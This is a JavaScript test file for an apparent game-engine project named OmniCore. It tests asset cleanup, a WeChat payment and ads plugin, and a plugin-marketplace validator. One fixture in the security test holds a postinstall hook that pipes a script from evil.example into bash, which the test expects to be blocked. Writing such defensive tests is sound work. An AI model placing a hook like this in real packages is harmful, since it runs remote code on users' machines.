import { execFileSync } from 'node:child_process';
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync
} from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { pathToFileURL } from 'node:url';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { MarketplaceServer } from '../src/index.js';

const tempRoots = [];

function makeTempRoot(prefix) {
  const root = mkdtempSync(path.join(tmpdir(), prefix));
  tempRoots.push(root);
  return root;
}

function writeJson(file, payload) {
  mkdirSync(path.dirname(file), { recursive: true });
  writeFileSync(file, `${JSON.stringify(payload, null, 2)}\n`, 'utf8');
}

describe('OmniCore full stack phase 3 asset publishing', () => {
  afterEach(() => {
    while (tempRoots.length) rmSync(tempRoots.pop(), { recursive: true, force: true });
  });

  it('cleans unused resources from platform asset builds with an explicit flag', () => {
    const root = makeTempRoot('omnicore-clean-unused-');
    const assets = path.join(root, 'assets');
    const out = path.join(root, 'out');
    mkdirSync(assets, { recursive: true });
    writeFileSync(path.join(assets, 'hero.png'), 'hero');
    writeFileSync(path.join(assets, 'unused.png'), 'unused');
    writeJson(path.join(assets, 'assets.manifest.json'), {
      images: [{ name: 'hero', path: 'hero.png', url: 'hero.png' }]
    });

    execFileSync(process.execPath, [
      path.resolve('scripts/build-platform-assets.js'),
      '--platform',
      'wechat',
      '--assets',
      assets,
      '--manifest',
      path.join(assets, 'assets.manifest.json'),
      '--out',
      out,
      '--clean-unused'
    ], { cwd: process.cwd(), encoding: 'utf8' });

    const report = JSON.parse(readFileSync(path.join(out, 'asset-package-report.json'), 'utf8'));
    const cleanReport = JSON.parse(readFileSync(path.join(out, 'unused-resources-cleaned.json'), 'utf8'));

    expect(existsSync(path.join(assets, 'hero.png'))).toBe(true);
    expect(existsSync(path.join(assets, 'unused.png'))).toBe(false);
    expect(report.cleanedResources).toEqual([
      expect.objectContaining({ path: 'unused.png', action: 'deleted' })
    ]);
    expect(cleanReport.cleaned[0]).toMatchObject({ path: 'unused.png', action: 'deleted' });
  });
});

describe('OmniCore full stack phase 3 WeChat monetization plugin package', () => {
  it('ships a standalone npm package that installs payment and ad providers', async () => {
    const packageRoot = path.resolve('packages/omnicore-plugin-wechat-monetization');
    const packageJson = JSON.parse(readFileSync(path.join(packageRoot, 'package.json'), 'utf8'));
    const readme = readFileSync(path.join(packageRoot, 'README.md'), 'utf8');
    const { default: plugin, createWechatMiniGameMonetizationPlugin } = await import(
      pathToFileURL(path.join(packageRoot, 'src', 'index.js')).href
    );
    const wx = createWxSpy();
    const OmniCore = {};

    const installed = plugin.install(OmniCore, { wx });
    const direct = createWechatMiniGameMonetizationPlugin({ wx });
    const payment = await OmniCore.Payment.requestPayment({ mode: 'game', offerId: 'offer-a' });
    const reward = await OmniCore.Ad.showRewardedVideoAd('reward-a');

    expect(packageJson).toMatchObject({
      name: '@omnicore/plugin-wechat-monetization',
      type: 'module',
      peerDependencies: { omnicore: '*' }
    });
    expect(readme).toContain('OmniCore.Payment');
    expect(installed.provider).toBe('wechat');
    expect(direct.name).toBe('WechatMiniGameMonetization');
    expect(payment).toMatchObject({ paid: true, provider: 'wechat' });
    expect(reward).toMatchObject({ completed: true, provider: 'wechat', placementId: 'reward-a' });
  });
});

describe('OmniCore full stack phase 3 marketplace security review', () => {
  it('validates plugin manifests and blocks dangerous lifecycle scripts before review', () => {
    const marketplace = new MarketplaceServer();
    const unsafe = {
      name: 'unsafe-payment',
      version: '1.0.0',
      developerId: 'dev-a',
      license: 'MIT',
      packageName: '@omnicore/unsafe-payment',
      scripts: {
        postinstall: 'curl https://evil.example/install.sh | bash'
      }
    };
    const safe = {
      name: 'wechat-monetization',
      version: '1.0.0',
      developerId: 'official',
      license: 'MIT',
      packageName: '@omnicore/plugin-wechat-monetization',
      keywords: ['omnicore-plugin', 'wechat']
    };

    expect(marketplace.validatePluginManifest(unsafe)).toMatchObject({
      ok: false,
      errors: expect.arrayContaining([
        expect.objectContaining({ code: 'dangerous-lifecycle-script' })
      ])
    });
    expect(marketplace.submitPlugin(unsafe)).toMatchObject({
      status: 'blocked',
      securityReview: expect.objectContaining({ ok: false })
    });
    expect(marketplace.submitPlugin(safe)).toMatchObject({
      status: 'pending_review',
      securityReview: expect.objectContaining({ ok: true })
    });
  });
});

function createWxSpy() {
  return {
    requestMidasPayment: vi.fn((options) => options.success?.({ orderId: options.offerId || 'order' })),
    createRewardedVideoAd: vi.fn(() => ({
      onClose(callback) {
        callback({ isEnded: true });
      },
      load: vi.fn(async () => undefined),
      show: vi.fn(async () => undefined)
    })),
    createBannerAd: vi.fn((options) => ({ type: 'banner', options }))
  };
}
